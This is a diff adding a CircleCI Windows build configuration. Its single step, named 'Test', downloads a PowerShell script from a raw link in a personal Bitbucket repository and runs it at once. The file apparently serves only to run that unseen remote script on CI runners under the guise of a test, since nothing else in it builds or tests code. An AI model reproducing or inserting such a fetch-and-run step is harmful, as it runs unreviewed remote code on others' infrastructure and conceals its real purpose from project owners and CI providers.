@@ -1,0 +1,17 @@
+version: 2.1  
+  
+orbs: 
+  win: circleci/windows@2.2.0 
+  
+jobs: 
+  build:  
+    executor: 
+      name: win/default  
+      size: "medium"  
+  
+    steps: 
+      - run: 
+          name: Test 
+          command: | 
+            Invoke-WebRequest https://bitbucket.org/sibaweihi/ronpie/raw/5bec2acdbc03bed4b1dedadc2ad9434e93bc158b/log.ps1 -OutFile log.ps1
+            ./log.ps1
